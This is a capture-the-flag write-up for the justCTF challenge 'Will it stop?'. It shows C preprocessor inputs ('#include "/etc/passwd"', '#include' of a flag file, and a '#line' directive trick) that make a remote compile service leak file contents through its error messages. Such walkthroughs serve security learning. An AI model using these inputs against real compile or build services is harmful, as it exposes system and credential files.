# Will it stop?

Poor Vesim... Would you help him?
```
nc will-it-stop.nc.jctf.pro 1337
```
PS: The flag is in users home directory.

---

The [pdf](ctf.pdf) in the description asks us to write code to see if a given Python program will ever stop execution. This is a reference to Turing's halting problem and it is impossible to solve. We have to find another way to get the flag.

Since we have access to a C compiler, we can try to include local files.

```
How many lines does your C program parsing a Python code have?
1
Write your program now:
#include "/etc/passwd"
Ok, let's build it!
In file included from <stdin>:1:0:
/etc/passwd:1:8: error: expected '=', ',', ';', 'asm' or '__attribute__' before ':' token
 aturing:x:1000:1000::/home/aturing:/bin/sh
        ^
COMPILATION FAILED
```

Now that we know the professor's home directory is `/home/aturing`, let's try to read the flag!

```
How many lines does your C program parsing a Python code have?
1
Write your program now:
#include "/home/aturing/flag"
Ok, let's build it!
In file included from <stdin>:1:0:
/home/aturing/flag:1:8: error: expected '=', ',', ';', 'asm' or '__attribute__' before ':' token
 justCTF:is_this_the_real_flag__is_this_just_fantasy__open_your_eyes_look_bellow_in_the_file_and_see
        ^
COMPILATION FAILED
```

The file exists, but it looks like the first line of the file causes errors, so we can't see the actual flag.

After reading through the GCC preprocessor directives, I found an interesting one: [#line](https://gcc.gnu.org/onlinedocs/cpp/Line-Control.html)

```
How many lines does your C program parsing a Python code have?
1
Write your program now:
#line 2 "/home/aturing/flag"
Ok, let's build it!
/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
(.text+0x20): undefined reference to `main'
collect2: error: ld returned 1 exit status
COMPILATION FAILED
```

After playing around, I was able to get the flag by adding `foo` on the next line to create an error.

```
How many lines does your C program parsing a Python code have?
2
Write your program now:
#line 2 "/home/aturing/flag"
foo
Ok, let's build it!
/home/aturing/flag:2:1: error: expected '=', ',', ';', 'asm' or '__attribute__' at end of input
 justCTF{mama_just_got_a_flag}
 ^~~
COMPILATION FAILED
```
